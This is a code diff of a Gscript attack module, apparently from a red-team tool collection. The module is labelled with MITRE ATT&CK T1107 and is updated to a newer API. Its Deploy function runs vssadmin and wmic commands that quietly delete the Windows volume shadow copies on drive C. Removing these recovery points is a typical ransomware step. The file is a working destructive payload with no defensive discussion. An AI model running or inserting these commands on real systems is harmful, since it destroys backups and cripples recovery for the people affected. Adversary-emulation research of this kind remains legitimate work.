@@ -2,7 +2,7 @@
 // Title: Delete Volume Shadow Copy
 // Author: ahhh
 // Purpose: Deletes the volume shadow copy with both wmic and vssadmin
-// Gscript version: 0.1.1
+// Gscript version: 1.0.0
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1107
 
 //priority:100
@@ -10,24 +10,15 @@
 
 var fn;
 
-function BeforeDeploy() {
-  LogInfo("starting execution of Delete Volume Shadow Copy");
-  return true; 
-}
-
 function Deploy() {  
+  console.log("starting execution of Delete Volume Shadow Copy");
   // Delete the volume shadow copy with the vssadmin tool
-  ForkExecuteCommand("vssadmin.exe", ["delete", "shadows", "/for=c:", "/oldest", "/quiet"]);
-  LogInfo("Deleted the volume shadow copy with the vssadmin tool");
+  G.exec.ExecuteCommandAsync("vssadmin.exe", ["delete", "shadows", "/for=c:", "/oldest", "/quiet"]);
+  console.log("Deleted the volume shadow copy with the vssadmin tool");
 
   // Delete the volume shadow copy with wmic
-  ForkExecuteCommand("wmic.exe", ["shadowcopy", "delete", "/nointeractive"]);
-  LogInfo("Deleted the volume shadow copy with wmic");
-
-  return true;
-}
-
-function AfterDeploy() {
-  LogInfo("done Deleting VSC");
+  G.exec.ExecuteCommandAsync("wmic.exe", ["shadowcopy", "delete", "/nointeractive"]);
+  console.log("Deleted the volume shadow copy with wmic");
+  console.log("done Deleting VSC");
   return true;
 }
